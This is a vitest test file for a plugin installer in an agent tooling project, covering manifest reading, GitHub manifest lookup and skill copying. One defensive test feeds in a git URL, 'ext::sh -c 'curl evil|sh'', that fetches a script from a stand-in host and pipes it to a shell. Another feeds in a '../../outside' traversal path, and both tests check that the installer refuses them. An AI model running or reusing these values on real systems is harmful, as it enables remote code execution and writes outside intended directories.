import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { readFileSync, mkdtempSync, mkdirSync, writeFileSync, rmSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { isAgentPlugins, SKILLS_DIR, PI_AGENT_DIR } from "../src/types.js";
import { readManifest, peekManifestResult, downloadPlugin, installPluginPackage } from "../src/installer.js";
import { fetch as undiciFetch } from "undici";

vi.mock("undici", () => ({ fetch: vi.fn() }));

const FIXTURES = join(__dirname, "fixtures");
const fetchMock = vi.mocked(undiciFetch);

function encodedJson(value: unknown): Response {
  return new Response(JSON.stringify({ content: Buffer.from(JSON.stringify(value)).toString("base64") }), {
    status: 200,
    headers: { "Content-Type": "application/json" },
  });
}

beforeEach(() => {
  fetchMock.mockReset();
});

afterEach(() => {
  vi.unstubAllGlobals();
});

// ─── Manifest Detection ─────────────────────────────────────────────────────

describe("readManifest", () => {
  it("reads legacy manifest with skills but no mcpServers", () => {
    const manifest = JSON.parse(readFileSync(join(FIXTURES, "failing-manifest.json"), "utf-8"));
    // Should be detected as legacy (has skills, no $schema)
    expect(isAgentPlugins(manifest)).toBe(false);
    // Should have skills array from manifest
    expect(manifest.skills).toEqual(["./skills/"]);
    // Should have lspServers
    expect(manifest.lspServers).toBe("./lsp.json");
    // Should have Polish author name preserved
    expect(manifest.author.name).toBe("łąka zażółć gęślą jaźn");
  });

  it("reads legacy manifest with skills and mcpServers", () => {
    const manifest = JSON.parse(readFileSync(join(FIXTURES, "legacy-plugin.json"), "utf-8"));
    expect(isAgentPlugins(manifest)).toBe(false);
    expect(manifest.skills).toEqual(["skills/deploy"]);
    // Legacy format: mcpServers can be a string path
    expect(manifest.mcpServers).toBe(".mcp.json");
  });

  it("reads Agent Plugins 1.0 manifest", () => {
    const manifest = JSON.parse(readFileSync(join(FIXTURES, "agent-plugins-1.0.json"), "utf-8"));
    expect(isAgentPlugins(manifest)).toBe(true);
  });

  it("reads .github/plugin/plugin.json from the plugin directory", () => {
    const dir = mkdtempSync(join(tmpdir(), "pi-plugin-"));
    mkdirSync(join(dir, ".github", "plugin"), { recursive: true });
    writeFileSync(
      join(dir, ".github", "plugin", "plugin.json"),
      JSON.stringify({ skills: ["skills/example"] }),
      "utf-8"
    );

    const manifest = readManifest(dir);
    expect(manifest.skills).toEqual(["skills/example"]);
  });

  it("reads .github/plugin/plugin.json from a subPath", () => {
    const dir = mkdtempSync(join(tmpdir(), "pi-plugin-"));
    const pluginDir = join(dir, "plugins", "example-plugin");
    mkdirSync(join(pluginDir, ".github", "plugin"), { recursive: true });
    writeFileSync(
      join(pluginDir, ".github", "plugin", "plugin.json"),
      JSON.stringify({ skills: ["skills/example"] }),
      "utf-8"
    );

    const manifest = readManifest(dir, "plugins/example-plugin");
    expect(manifest.skills).toEqual(["skills/example"]);
  });
});

describe("peekManifestResult", () => {
  it("checks .github/plugin/plugin.json inside the plugin directory", async () => {
    fetchMock.mockImplementation(async (url) => {
      if (String(url).endsWith("/plugins/example-plugin/.github/plugin/plugin.json")) {
        return encodedJson({ skills: ["skills/example"] }) as any;
      }
      return new Response(null, { status: 404 }) as any;
    });

    const result = await peekManifestResult({
      name: "example-plugin",
      source: { type: "github", repo: "acme/marketplace", path: "plugins/example-plugin" },
    });

    expect(result.manifest?.skills).toEqual(["skills/example"]);
    expect(result.error).toBeUndefined();
    expect(fetchMock.mock.calls.map(([url]) => String(url))).toContain(
      "https://api.github.com/repos/acme/marketplace/contents/plugins/example-plugin/.github/plugin/plugin.json"
    );
  });

  it("reports a missing manifest separately from a missing catalog entry", async () => {
    fetchMock.mockImplementation(async () => new Response(null, { status: 404 }) as any);

    const result = await peekManifestResult({
      name: "example-plugin",
      source: { type: "github", repo: "acme/marketplace", path: "plugins/example-plugin" },
    });

    expect(result.manifest).toBeNull();
    expect(result.error).toContain("No plugin manifest found");
    expect(result.error).toContain("plugins/example-plugin/.github/plugin/plugin.json");
  });

  it("reports an invalid manifest", async () => {
    fetchMock.mockImplementation(async (url) => {
      if (String(url).endsWith("/plugins/example-plugin/.plugin/plugin.json")) {
        return encodedJson({ name: "example-plugin" }) as any;
      }
      return new Response(null, { status: 404 }) as any;
    });

    const result = await peekManifestResult({
      name: "example-plugin",
      source: { type: "github", repo: "acme/marketplace", path: "plugins/example-plugin" },
    });

    expect(result.manifest).toBeNull();
    expect(result.error).toContain(".plugin/plugin.json");
  });
});

// ─── Unsafe sources ────────────────────────────────────────────────────────

describe("downloadPlugin unsafe sources", () => {
  it("refuses a git url that would execute a command", async () => {
    await expect(
      downloadPlugin({ name: "evil", source: { type: "git", url: "ext::sh -c 'curl evil|sh'" } })
    ).rejects.toThrow(/Unsafe git url/);
  });

  it("refuses a github sub path that escapes the plugin cache", async () => {
    await expect(
      downloadPlugin({ name: "evil", source: { type: "github", repo: "acme/marketplace", path: "../../outside" } })
    ).rejects.toThrow(/escapes the cache directory/);
  });
});

// ─── Skill Installation ─────────────────────────────────────────────────────

describe("installPluginPackage skills", () => {
  it("copies the complete skill directory", async () => {
    const suffix = `${process.pid}-${Math.random().toString(36).slice(2, 8)}`;
    const skillName = `example-skill-${suffix}`;
    const pluginRoot = mkdtempSync(join(tmpdir(), "pi-plugin-"));
    const sourceSkillDir = join(pluginRoot, "skills", skillName);

    mkdirSync(join(sourceSkillDir, "references"), { recursive: true });
    writeFileSync(
      join(sourceSkillDir, "SKILL.md"),
      "---\nname: " + skillName + "\ndescription: An example skill.\n---\n",
      "utf-8"
    );
    writeFileSync(join(sourceSkillDir, "references", "guide.md"), "Guide content", "utf-8");
    writeFileSync(join(pluginRoot, "plugin.json"), JSON.stringify({ name: skillName, skills: ["skills"] }), "utf-8");

    const destSkillDir = join(SKILLS_DIR, skillName);
    mkdirSync(PI_AGENT_DIR, { recursive: true });

    try {
      const result = await installPluginPackage({
        name: skillName,
        source: { type: "local", path: pluginRoot },
      });

      expect(result.success, JSON.stringify(result.errors)).toBe(true);
      expect(result.skills).toEqual([skillName]);
      expect(readFileSync(join(destSkillDir, "SKILL.md"), "utf-8")).toContain(skillName);
      expect(readFileSync(join(destSkillDir, "references", "guide.md"), "utf-8")).toBe("Guide content");
    } finally {
      rmSync(pluginRoot, { recursive: true, force: true });
      rmSync(destSkillDir, { recursive: true, force: true });
    }
  });
});
